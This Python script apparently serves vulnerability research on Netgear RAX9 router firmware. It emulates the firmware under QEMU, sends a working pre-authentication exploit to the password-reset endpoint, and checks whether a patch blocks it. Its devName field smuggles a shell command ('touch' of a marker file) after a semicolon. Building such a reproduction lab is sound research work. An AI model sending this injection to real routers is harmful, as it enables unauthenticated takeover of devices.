#!/usr/bin/env python3
"""Build and run an isolated full-system RAX9 password-reset RCE lab."""

from __future__ import annotations

import argparse
import os
import shutil
import socket
import subprocess
import time
import urllib.parse
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
IMAGE = (
    ROOT
    / "known_firmware/extracted/0d20c9b101b197d3/"
    "_RAX9-V1.0.3.32.zip.extracted/RAX9-V1.0.3.32.img"
)
SQUASHFS_OFFSET = 3_672_064
INIT = ROOT / "known_firmware/emulation/RAX9/full_system_web_init"
LIGHTTPD_CONF = (
    ROOT / "known_firmware/emulation/RAX9/rax9-full-system-lighttpd.conf"
)
LAB = ROOT / "known_firmware/emulation/RAX9/full-system-web-lab"
STAGING = Path("/tmp/friday-rax9-full-system-root")
KERNEL = Path("/tmp/rax9-vmlinuz-6.1.0-50-4kc-malta")
PCNET_MODULE = Path(
    "/tmp/rax9-debian-malta-initrd/lib/modules/6.1.0-50-4kc-malta/"
    "kernel/drivers/net/ethernet/amd/pcnet32.ko"
)
MII_MODULE = Path(
    "/tmp/rax9-debian-malta-initrd/lib/modules/6.1.0-50-4kc-malta/"
    "kernel/drivers/net/mii.ko"
)
INITRAMFS = LAB / "rax9-web-rootfs.cpio.gz"
SERIAL = LAB / "serial.log"
QEMU_LOG = LAB / "qemu.log"
PIDFILE = LAB / "qemu.pid"
HOST_PORT = 35_909
ROOTFS_SOURCE: Path | None = None


def run(command: list[str], **kwargs: object) -> subprocess.CompletedProcess[str]:
    return subprocess.run(command, check=True, text=True, **kwargs)


def build() -> None:
    missing = [
        str(path)
        for path in (
            INIT, LIGHTTPD_CONF, KERNEL, PCNET_MODULE, MII_MODULE
        )
        if not path.is_file()
    ]
    if ROOTFS_SOURCE is None and not IMAGE.is_file():
        missing.append(str(IMAGE))
    if ROOTFS_SOURCE is not None and not ROOTFS_SOURCE.is_dir():
        missing.append(str(ROOTFS_SOURCE))
    if missing:
        raise SystemExit("missing prerequisites: " + ", ".join(missing))

    LAB.mkdir(parents=True, exist_ok=True)
    shutil.rmtree(STAGING, ignore_errors=True)
    if ROOTFS_SOURCE is not None:
        shutil.copytree(ROOTFS_SOURCE, STAGING, symlinks=True)
    else:
        extracted = subprocess.run([
            "unsquashfs",
            "-o",
            str(SQUASHFS_OFFSET),
            "-d",
            str(STAGING),
            str(IMAGE),
        ], text=True)
        if extracted.returncode not in (0, 2):
            raise SystemExit(f"unsquashfs failed with {extracted.returncode}")
    required = (
        STAGING / "usr/sbin/lighttpd",
        STAGING / "www/pwd_reset/reset_pwd.plua",
        STAGING / "usr/lib/lua/webPostHandler/accessCtrlDev.lua",
        STAGING / "usr/lib/lua/commonFunc/fork.lua",
    )
    missing_extracted = [str(path) for path in required if not path.is_file()]
    if missing_extracted:
        raise SystemExit(
            "incomplete SquashFS extraction: " + ", ".join(missing_extracted)
        )
    shutil.copy2(INIT, STAGING / "init")
    os.chmod(STAGING / "init", 0o755)
    shutil.copy2(
        LIGHTTPD_CONF, STAGING / "etc/rax9-full-system-lighttpd.conf"
    )
    module_root = STAGING / "lib/modules/6.1.0-50-4kc-malta"
    module_path = module_root / "kernel/drivers/net/ethernet/amd"
    module_path.mkdir(parents=True, exist_ok=True)
    shutil.copy2(PCNET_MODULE, module_path / "pcnet32.ko")
    # The firmware's OpenWrt kmodloader scans only the version-directory root.
    shutil.copy2(PCNET_MODULE, module_root / "pcnet32.ko")
    shutil.copy2(MII_MODULE, module_root / "mii.ko")
    source_module_root = PCNET_MODULE.parents[5]
    for metadata in source_module_root.glob("modules.*"):
        if metadata.is_file():
            shutil.copy2(metadata, module_root / metadata.name)
    for relative in (
        "proc", "sys", "dev", "run", "tmp", "var/run", "var/log",
        "var/tmp", "var/state",
    ):
        (STAGING / relative).mkdir(parents=True, exist_ok=True)

    vulnerable = STAGING / "usr/lib/lua/commonFunc/fork.lua"
    text = vulnerable.read_text()
    expected = 'nixio.exec("/bin/sh", "-c", command)'
    if expected not in text or "rax9-fork-command.log" in text:
        raise SystemExit("staging root is not the clean production fork.lua")

    command = (
        f"cd '{STAGING}' && find . -print0 | "
        f"cpio --null -o --format=newc 2>/dev/null | "
        f"gzip -1 > '{INITRAMFS}'"
    )
    subprocess.run(["/bin/sh", "-c", command], check=True)
    print(f"initramfs={INITRAMFS}")
    print(f"production_fork_sha256={sha256(vulnerable)}")


def sha256(path: Path) -> str:
    result = subprocess.run(
        ["sha256sum", str(path)],
        check=True,
        text=True,
        capture_output=True,
    )
    return result.stdout.split()[0]


def stop() -> None:
    if not PIDFILE.exists():
        return
    try:
        pid = int(PIDFILE.read_text().strip())
        cmdline = Path(f"/proc/{pid}/cmdline")
        if cmdline.exists() and b"qemu-system-mipsel" in cmdline.read_bytes():
            os.kill(pid, 15)
            for _ in range(30):
                if not cmdline.exists():
                    break
                time.sleep(0.1)
    except (ValueError, ProcessLookupError, PermissionError):
        pass
    PIDFILE.unlink(missing_ok=True)


def start() -> None:
    if not INITRAMFS.is_file():
        raise SystemExit("build the initramfs first")
    stop()
    SERIAL.unlink(missing_ok=True)
    QEMU_LOG.unlink(missing_ok=True)
    command = [
        "qemu-system-mipsel",
        "-M", "malta",
        "-cpu", "24Kf",
        "-m", "512M",
        "-kernel", str(KERNEL),
        "-initrd", str(INITRAMFS),
        "-append", "console=ttyS0 rdinit=/init panic=-1",
        "-display", "none",
        "-monitor", "none",
        "-serial", f"file:{SERIAL}",
        "-netdev",
        (
            "user,id=lan,restrict=on,"
            f"hostfwd=tcp:127.0.0.1:{HOST_PORT}-:80"
        ),
        "-device", "pcnet,netdev=lan",
        "-no-reboot",
    ]
    with QEMU_LOG.open("wb") as output:
        process = subprocess.Popen(
            command,
            stdout=output,
            stderr=subprocess.STDOUT,
            start_new_session=True,
        )
    PIDFILE.write_text(f"{process.pid}\n")
    print(
        f"qemu_pid={process.pid} network=user,restrict=on "
        f"http=127.0.0.1:{HOST_PORT}->guest:80"
    )


def wait_for(marker: str, timeout: int = 180) -> str:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        text = SERIAL.read_text(errors="replace") if SERIAL.exists() else ""
        if marker in text:
            return text
        if "Kernel panic" in text:
            raise SystemExit("guest kernel panic; inspect serial.log")
        time.sleep(0.5)
    raise SystemExit(f"timed out waiting for {marker}; inspect serial.log")


def exchange(body: bytes) -> bytes:
    request = (
        b"POST /pwd_reset/reset_pwd.plua HTTP/1.1\r\n"
        b"Host: routerlogin.net\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        + f"Content-Length: {len(body)}\r\n".encode()
        + b"Connection: close\r\n\r\n"
        + body
    )
    with socket.create_connection(("127.0.0.1", HOST_PORT), timeout=10) as client:
        client.sendall(request)
        response = bytearray()
        while True:
            try:
                chunk = client.recv(4096)
            except TimeoutError:
                return bytes(response)
            if not chunk:
                return bytes(response)
            response.extend(chunk)


def prove() -> None:
    wait_for("FRIDAY_RAX9_FULL_SYSTEM_READY=1")
    request_json = (
        '{"function":"accessCtrlDev","data":[{"action":"add","iid":"1",'
        '"rule":"allow","devName":"FRIDAY;touch '
        '/tmp/rax9-preauth-rce-marker;#","macAddr":"02:00:00:00:00:01"}]}'
    )
    body = urllib.parse.urlencode({"inputJson": request_json}).encode()
    response = exchange(body)
    print(response.decode("utf-8", "replace"))
    text = wait_for("FRIDAY_RAX9_PREAUTH_RCE_MARKER=present", timeout=30)
    print("\n".join(text.splitlines()[-20:]))


def verify_fixed() -> None:
    wait_for("FRIDAY_RAX9_FULL_SYSTEM_READY=1")
    request_json = (
        '{"function":"accessCtrlDev","data":[{"action":"add","iid":"1",'
        '"rule":"allow","devName":"FRIDAY;touch '
        '/tmp/rax9-preauth-rce-marker;#","macAddr":"02:00:00:00:00:01"}]}'
    )
    body = urllib.parse.urlencode({"inputJson": request_json}).encode()
    response = exchange(body)
    decoded = response.decode("utf-8", "replace")
    print(decoded)
    time.sleep(2)
    serial = SERIAL.read_text(errors="replace")
    rejection = "is not contained in password reset flow"
    if rejection not in decoded and rejection not in serial:
        raise SystemExit("expected dispatcher rejection was not observed")
    if "FRIDAY_RAX9_PREAUTH_RCE_MARKER=present" in serial:
        raise SystemExit("command marker unexpectedly appeared")
    print("FRIDAY_RAX9_V10944_FIXED=confirmed marker=absent")


def status() -> None:
    if SERIAL.exists():
        print("\n".join(SERIAL.read_text(errors="replace").splitlines()[-60:]))


def main() -> None:
    global ROOTFS_SOURCE, LAB, INITRAMFS, SERIAL, QEMU_LOG, PIDFILE, HOST_PORT
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "action",
        choices=(
            "build", "start", "prove", "verify-fixed", "run", "status", "stop"
        ),
    )
    parser.add_argument(
        "--rootfs",
        type=Path,
        help="use an already-extracted production root instead of the 1.0.3.32 image",
    )
    parser.add_argument(
        "--lab-dir",
        type=Path,
        help="write generated and runtime evidence to a separate lab directory",
    )
    parser.add_argument("--port", type=int, default=HOST_PORT)
    args = parser.parse_args()
    ROOTFS_SOURCE = args.rootfs
    HOST_PORT = args.port
    if args.lab_dir is not None:
        LAB = args.lab_dir.resolve()
        INITRAMFS = LAB / "rax9-web-rootfs.cpio.gz"
        SERIAL = LAB / "serial.log"
        QEMU_LOG = LAB / "qemu.log"
        PIDFILE = LAB / "qemu.pid"
    if args.action in ("build", "run"):
        build()
    if args.action in ("start", "run"):
        start()
    if args.action in ("prove", "run"):
        try:
            prove()
        finally:
            if args.action == "run":
                stop()
    if args.action == "verify-fixed":
        verify_fixed()
    if args.action == "status":
        status()
    if args.action == "stop":
        stop()


if __name__ == "__main__":
    main()
